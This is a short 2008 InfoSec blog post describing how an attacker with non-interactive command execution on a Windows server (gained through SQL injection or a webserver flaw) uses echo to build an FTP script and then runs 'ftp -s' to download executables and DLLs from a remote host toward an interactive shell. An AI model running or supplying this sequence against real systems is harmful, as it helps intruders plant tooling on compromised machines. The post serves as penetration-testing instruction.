---
layout: post
image: 
    feature: geek.png
status: publish
published: true
title: Fetching files via echo, FTP in a non interactive shell environment
wordpress_id: 240
wordpress_url: http://pro.grammatic.org/post-fetching-files-via-echo-ftp-in-a-non-interactive-shell-environment-62.aspx
date: !binary |-
  MjAwOC0xMi0wNyAwNjozMDo1NSArMDEwMA==
date_gmt: !binary |-
  MjAwOC0xMi0wNyAwNjozMDo1NSArMDEwMA==
categories:
- Technology
- InfoSec
tags:
- information security
comments: []
doi: "https://doi.org/10.59348/rb4hr-3h831"
archive: "https://wayback.archive-it.org/22123/20231101171300/https://eve.gd/2008/12/07/fetching-files-via-echo-ftp-in-a-non-interactive-shell-environment"
---
<p>Once you have basic, non-interactive shell access to a Windows box, there are a limited number of ways in which you can transfer files to the remote host. This brief article will explicate the echo/ftp method.</p>
<p>If you can execute, be it by SQL Injection, or a webserver vulnerability the echo command, then you can write a script file which can fetch a file of your choosing from a remote host.</p>
<p>The sequence of commands you issue should be in the following format:</p>

{% highlight bash %}
echo open [ip] [port] >> ftpscript.txt
echo [user]>> c:\inetpub\scripts\ftpscript.txt
echo [pw] >> c:\inetpub\scripts\ftpscript.txt
echo get xxx.exe >> c:\inetpub\scripts\ftpscript.txt
echo get xxx.txt >> c:\inetpub\scripts\ftpscript.txt
echo get xxx.dll >> c:\inetpub\scripts\ftpscript.txt
echo quit >> c:\inetpub\scripts\ftpscript.txt
{% endhighlight %}

<p>This will create a file at c:\inetpub\scripts\ftpscript.txt that looks like this:</p>

{% highlight bash %}
open [ip] [port]
[user]
[pw]
get xxx.exe
get xxx.txt
get xxx.dll
quit
{% endhighlight %}

<p>If you then execute ftp -s:c:\inetpub\scripts\ftpscript.txt, your files will be fetched from the remote FTP server and you can hopefully secure some form of interactive shell access.</p>





